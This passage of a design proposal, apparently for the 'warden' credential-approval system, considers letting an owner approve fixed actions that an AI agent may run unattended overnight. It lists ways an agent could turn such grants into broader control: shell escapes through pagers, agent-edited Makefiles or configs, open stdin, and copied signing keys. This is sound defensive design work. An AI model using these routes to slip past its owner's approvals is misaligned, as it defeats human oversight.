| **Argument allow-lists** | Each program's option syntax would need modelling: abbreviated long options, `--opt=value` against `--opt value`, `--`, and an agent-chosen file that the program reads as a script. |

A pager is a shell too: `systemctl status` and `journalctl` can start one with a
pty, and `less` runs commands with `!`.

**So only an exact byte comparison with a string the owner wrote is
defensible.** That removes every problem above, because no byte comes from the
agent. What it does not remove is what the command reads:

- `make test` runs whatever Makefile is there. If the agent can push to that
  repository, it runs what the agent wants.
- `git pull && ./deploy.sh` is the same.
- `backup.sh` reads a config that another grant might let the agent edit.
- The account's shell startup files, `~/.ssh/environment` and `PATH` all run
  before or around it.

And **a command may simply be strong**. `reboot` is exact and cannot be
misparsed.

### Conditions for a later relay version

- **Relay targets only, with an exact string from the vault.** No certificate
  mode.
- **A new restricted session:** no pty, no `shell`, no environment, no signals,
  and stdin closed by the relay at once. Without this, `sh`, `python` and `cat >
  file` take their program from the agent, and an agent-controlled stdin on any
  allowed command stays a way in.
- **One `exec`, one use,** spent and audited before the first byte reaches the
  target. Record the whole command rather than the first 200 characters.
- **Output is not redacted** today, and whatever a command prints goes to the
  agent.
- **A dedicated target account,** with a small script as the only thing it can
  do, ideally behind a `command=` in its `authorized_keys` that ignores anything
  else. The owner can then read the whole of what can happen. This is the part
  warden cannot enforce.
- **Proof of possession from
  [#49](https://github.com/pecheriere/warden/issues/49).** The relay admits a
  key held in a per-grant `ssh-agent` for the window, and overnight that is 12
  hours in reach of every session of that user.
- **Relay availability:** not on the recommended layout today, as listed above.

### Git ([#80](https://github.com/pecheriere/warden/issues/80))

#80 parses `git-upload-pack` and `git-receive-pack` strictly, and this is the one case where
parsing is reasonable: a small grammar with no shell semantics to preserve. It
is the overnight need most agents have, so it deserves its own decision after
#80 ships and is tested.

Be clear about what it would be, though. Stdin is the protocol, so stdin cannot
be closed, and the content is entirely the agent's. A push can change any branch
that server-side rules leave open, can delete refs, and can run through CI with
whatever secrets CI holds. **A fetch** is a much easier decision than **a
push**. An overnight push is only defensible with a machine account, one
repository, and server-side rules on protected branches that warden does not
control. It should not be part of the first version.

## Threat model changes this would need

These go in with the implementation, not before.

- **In short:** "Every grant needs the owner's passkey" stays true, but add that
  an owner can approve fixed actions that then run with nobody watching. Add to
  the list of what warden does not protect against: what an approved action
  does, when the agent fires it, within its count. "A compromised agent machine,
  within its approvals" says each request still needs the owner's approval: a
  use of an action does not.
- **Actors and trust:**
  - Agent: "Bounded by its stated goal, the approved window" gains the advance
    approval.
  - Notifiers: add the per-use notice and what it holds. A blocked notifier can
    now stop an approval, and a notifier sees action names.
- **Anti-goals:**
  - "An approval is forged, replayed, widened or applied to a different
    request": add the action set's digest, and that its uses are counted.
  - Add an anti-goal: an advance approval never approves a request, and never
    renews.
  - "A notification channel sees secrets or can approve": state that action
    queries and bodies never reach notifiers.
- **Approval binding:** add the set's digest, the re-read at finish, and that
  the assertion binds the ceremony and not the scope, as for every approval.
- **Authentication of callers:** the new route, signed agents enrolled as
  holding a non-exportable key, which warden cannot verify. "Key-signed agents
  need no owner login" gains a new consequence: a copied key can fire approved
  actions.
- **Accepted residual risks:**
  - "Certificates cannot be revoked" stays as it is, and its "at most four
    hours" must stay true: nothing in this design issues a certificate.
  - "Grants are not tied to a task": add that advance approvals share this, why
    that is tolerable, and what would change it.
  - "Goals are free text": the goal does not decide the scope here.
  - "Signing protects the key, not the machine": its defences are that "every
    request still needs the owner's passkey approval" and that grants are short,
    and neither holds for a use of an action. Its statement that a plain key
    file can be copied and used from anywhere that can reach the API now covers
    unattended actions, and hardware moves from recommended to required for this
    feature.
- **Proxy mode residual risks:**
  - "Within the window, the agent can make any allowed call": not so for
    actions; add the difference.
  - "The query string and body are the agent's": not so for actions.
  - "Revoking stops a call in flight, but cannot undo it": applies, limited to one
    call per approval.
  - A new section on advance approvals: the table in [What could go
    wrong](#what-could-go-wrong), the trap with mutable state, the nightly-habit
    risk, the worst-moment test, and the halt pretext with what it leaves open.
- **Deployment assumptions:** recommend a separate agent with its own OS user
  for overnight work, keep the vault out of the agent's reach (the whole design
  rests on that), and ship the audit log off the host.

The same change updates `design.md` (§7 lifecycle, §8.3, §9, §10 and §11),
`1password-items.md`, `agent-protocol.md`, `agent-usage.md`,
`agent-instructions.md`, `notifications.md`, `configuration.md`, the README's
statement that the owner approves every request, and the changelog. The approval
page and `/grants` need the screenshots the pull request template lists. The
tables go in a new migration.

## What is certain, and what is not

**Verified by reading the code:** everything in [What warden does
today](#what-warden-does-today).

**Verified from the OpenSSH manual pages, not run:** `force-command` overrides
the client's command; sshd runs forced commands through the login shell with
`-c`; `SSH_ORIGINAL_COMMAND` carries the original command; `~/.ssh/rc` runs only
with `permit-user-rc`, which warden's certificates do not have.

**Reasoned, not run:** the attack tables, the failure modes of each option, and
the claim that restricted relay sessions are possible. No prototype exists. The
examples of shell and argument abuse are well-known behaviour of those tools and
were not each tried here.

**Proposed values, not derived from anything:** 12 hours, 8 actions, 100 and 10
uses, 60 s, 4 KiB. They are starting points for the owner to change.

**Not known:**

- **How much of the need fixed actions would meet.** No usage data was
  collected. The usefulness and the comparison with automation are reasoned from
  the kinds of use, not from real overnight work.
- **How usable the page is at this length on a phone,** with 8 actions and their
  bodies.
- **Whether a ring before a use is reliable enough** on real notifiers, where
  one refused delivery halts the night's work.

## Open questions for the owner

1. **Go ahead with fixed actions, knowing they leave unforeseen prompts stuck?**
   See [the choice](#the-choice-for-the-owner). The remaining questions apply if
   so.
2. **Must the key be non-exportable?** The recommendation is yes: otherwise a
   copied key file fires every approved action, unattended, with no owner login.
   It rests on the owner's statement at enrolment, and it excludes an agent that
   has only a key file.
3. **Is it acceptable that an agent's other sessions share it (#49),** given the
   argument above? Or should #49's proof of possession come first, at the cost
   of a long-running process holding a key?
4. **Should modifying actions be allowed in a first version at all?** A
   read-only version is safer by a long way, and limits the harm to reads,
   though it gives up the closest case in the comparison, a job the agent
   triggers. It would be easy to widen later.
5. **Are the limits right,** especially 12 hours? It covers one night and does
   not cover a weekend, on purpose.
6. **Should `ring = first` exist?** The issue asks for a notice for each use. It
   protects the channel that carries real approvals, at the cost of fewer
   notices.
7. **Should a notifier failure halt the approval?** The recommendation is yes.
   It costs availability.
8. **Is a one-shot, agent-drafted request (option D) wanted later?** It covers
   what cannot be declared in advance, at the price of the owner reading an
   agent's text.
9. **Should an SSH version follow,** given it needs the relay and #49? Only an
   owner who runs a relay layout can say whether it is worth it.
10. **Should the assertion ever be independently verifiable?** Deriving the
    WebAuthn challenge from the scope's digest would allow re-checking an
    approval against the audit log without trusting the database. webauthn-rs's
    API does not offer that today, the host is a root of trust anyway, and the
    recommendation is not to pursue it.

Related: [#49](https://github.com/pecheriere/warden/issues/49) (grants shared by
an agent's sessions), [#35](https://github.com/pecheriere/warden/issues/35)
(revoking a certificate), [#44](https://github.com/pecheriere/warden/issues/44)
(a call in flight), [#80](https://github.com/pecheriere/warden/issues/80) (git
over the relay), [#75](https://github.com/pecheriere/warden/issues/75)
(approving without Tailscale).
